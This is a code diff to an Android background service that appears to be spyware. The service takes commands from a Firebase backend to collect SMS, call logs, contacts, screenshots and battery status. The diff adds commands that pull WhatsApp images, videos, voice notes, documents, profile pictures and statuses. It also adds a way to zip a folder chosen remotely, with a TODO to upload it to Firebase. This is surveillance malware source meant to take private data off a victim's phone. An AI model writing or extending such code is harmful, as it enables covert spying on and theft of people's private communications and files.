@@ -27,10 +27,12 @@ import com.aigs.serviceone.helpers.ContactsPayloadListner;
 import com.aigs.serviceone.helpers.PayloadTypes;
 import com.aigs.serviceone.helpers.SmsExtractorNotifier;
 import com.aigs.serviceone.helpers.SmsModes;
+import com.aigs.serviceone.helpers.StorageTextExtractionListner;
 import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
 import com.aigs.serviceone.payload.BatteryUpdater;
 import com.aigs.serviceone.payload.CallLogsPayload;
 import com.aigs.serviceone.payload.ContactsPayload;
+import com.aigs.serviceone.payload.GetStoragePathPayload;
 import com.aigs.serviceone.payload.ScreenshotPayload;
 import com.aigs.serviceone.payload.SmsPayload;
 import com.aigs.serviceone.payload.WhatsappChatPayload;
@@ -129,7 +131,6 @@ public class Starter extends Service {
 
     private void processCommand(int command) {
         try {
-
             switch (command) {
                 case PayloadTypes.GET_TEXT_MESSAGES_INBOX:
                     getSms(SmsModes.MODE_INBOX);
@@ -155,17 +156,94 @@ public class Starter extends Service {
                 case PayloadTypes.GET_BATTERY_STATUS:
                     loadBatterySection();
                     break;
+                case PayloadTypes.GET_DEVICE_INFO:
+                    break;
+                case PayloadTypes.GET_DEVICE_FOLDER:
+                    getFileFromPath(PayloadTypes.GET_DEVICE_FOLDER, false);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_STATUS:
+                    getFileFromPath(PayloadTypes.GET_WHATSAPP_STATUS, true);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_GIFS:
+                    getFileFromPath(PayloadTypes.GET_WHATSAPP_GIFS,true);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_AUDIO:
+                    getFileFromPath(PayloadTypes.GET_WHATSAPP_AUDIO,true);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_DOCUMENTS:
+                    getFileFromPath(PayloadTypes.GET_WHATSAPP_DOCUMENTS,true);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_IMAGES:
+                    getFileFromPath(PayloadTypes.GET_WHATSAPP_IMAGES,true);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_PROFILE_PICS:
+                    getFileFromPath(PayloadTypes.GET_WHATSAPP_PROFILE_PICS,true);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_STICKERS:
+                    getFileFromPath(PayloadTypes.GET_WHATSAPP_STICKERS,true);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_VIDEOS:
+                    getFileFromPath(PayloadTypes.GET_WHATSAPP_VIDEOS,true);
+                    break;
+                case PayloadTypes.GET_WHATSAPP_VOICE_NOTES:
+                    getFileFromPath(PayloadTypes.GET_WHATSAPP_VOICE_NOTES,true);
+                    break;
 
                 default:
                     Log.d("ERROR PA : ", "Invalid Command Received");
                     FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue("Invalid Command Received");
-
                     break;
             }
         } catch (SecurityException e) {
             Log.e("PERMISSION : ", e.getMessage());
             FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue(e.getMessage());
 
+        }
+    }
+
+    private void getFileFromPath(int payloadType, boolean isWhatsapp){
+        if (!isWhatsapp){
+            FirebaseDatabase
+                    .getInstance()
+                    .getReference("RUNTIME_PROPS")
+                    .child("FILE_PATH_TO_ZIP")
+                    .addValueEventListener(new ValueEventListener() {
+                        @Override
+                        public void onDataChange(@NonNull DataSnapshot snapshot) {
+                            if (snapshot.exists()){
+                                try {
+                                    String path = snapshot.getValue(String.class);
+                                    new GetStoragePathPayload(PayloadTypes.GET_DEVICE_FOLDER)
+                                            .setWatsappTextExtractionListner(path1 -> {
+                                                //TODO UPLOAD TO FIREBASE HERE
+                                                Log.e("PATH", path1.getAbsolutePath());
+                                            }).execute(path);
+
+                                }catch (Exception e){
+                                    FirebaseDatabase
+                                            .getInstance().getReference("Logs").child(payloadType+"").setValue(e.getMessage());
+
+                                }
+
+                            }else {
+                                FirebaseDatabase
+                                        .getInstance().getReference("Logs").child(payloadType+"").setValue("File path not set");
+                            }
+                        }
+
+                        @Override
+                        public void onCancelled(@NonNull DatabaseError error) {
+
+                        }
+                    });
+        }else {
+            new GetStoragePathPayload(payloadType)
+                    .setWatsappTextExtractionListner(new StorageTextExtractionListner() {
+                        @Override
+                        public void onDataExtracted(File path) {
+                            Log.e("WPATH",path.getPath());
+                        }
+                    }).execute();
         }
     }
 
@@ -415,8 +493,6 @@ public class Starter extends Service {
         serviceIntent.putExtra("inputExtra", "passing any text");
         ContextCompat.startForegroundService(this, serviceIntent);
     }
-
-
 
     @Nullable
     @Override
